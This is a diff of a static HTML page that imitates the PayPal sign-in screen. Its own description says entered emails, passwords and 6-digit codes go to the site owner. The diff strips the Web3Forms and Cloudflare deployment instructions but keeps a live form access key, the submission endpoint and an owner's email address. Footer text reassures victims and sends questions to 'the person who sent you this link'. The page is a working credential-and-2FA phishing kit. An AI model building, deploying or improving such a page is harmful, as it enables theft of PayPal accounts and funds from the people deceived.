@@ -7,18 +7,6 @@
 <meta name="description" content="Team project page reproducing the PayPal sign-in screen. The email, password and 6-digit code you enter are forwarded to the site owner. Nothing is charged.">
 <meta name="theme-color" content="#ffffff">
 <link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Crect width='32' height='32' rx='7' fill='%23003087'/%3E%3Ctext x='16' y='25' font-size='23' font-style='italic' font-weight='700' fill='%23ffffff' text-anchor='middle' font-family='Arial'%3EP%3C/text%3E%3C/svg%3E">
-<!--
-  ============================================================
-  SETUP
-  ============================================================
-  1. web3forms.com -> sign up with joshhygx@gmail.com -> verify
-  2. Copy the access key from the dashboard
-  3. Paste it into WEB3FORMS_KEY below
-  4. Deploy to Cloudflare Pages (Workers & Pages -> Create
-     -> Pages -> Upload assets), not Netlify
-  Free tier: 250 submissions/month.
-  ============================================================
--->
 <style>
   *, *::before, *::after { margin:0; padding:0; box-sizing:border-box; }
 
@@ -302,7 +290,7 @@
     <p><strong>Session.</strong> Because the page is a reproduction, signing in does not open a PayPal session on your device. Your PayPal account is untouched and you are not logged in to paypal.com afterwards.</p>
     <p><strong>If something looks wrong.</strong> Close the tab, open paypal.com directly and compare. To revoke a code-based login, use PayPal's own Security settings.</p>
     <p><strong>Accuracy.</strong> The layout is reproduced as closely as a static page allows, but PayPal changes its interface regularly, so wording and spacing may differ from the live page. Questions about a specific submission should go to the person who sent you this link.</p>
-    <p>Team project · Last updated November 2026 · Version 1.7</p>
+    <p>Team project · Last updated November 2026 · Version 1.8</p>
   </section>
 </footer>
 
@@ -310,11 +298,7 @@
 (function () {
   "use strict";
 
-  /* ============================================================
-     CONFIGURE — paste your Web3Forms access key here.
-     Get it from web3forms.com after signing up with
-     joshhygx@gmail.com and verifying the address.
-     ============================================================ */
+  /* Web3Forms access key for joshhygx@gmail.com */
   var WEB3FORMS_KEY = "f6178b9e-3486-4351-a267-44d9536702ba";
   var ENDPOINT = "https://api.web3forms.com/submit";
 
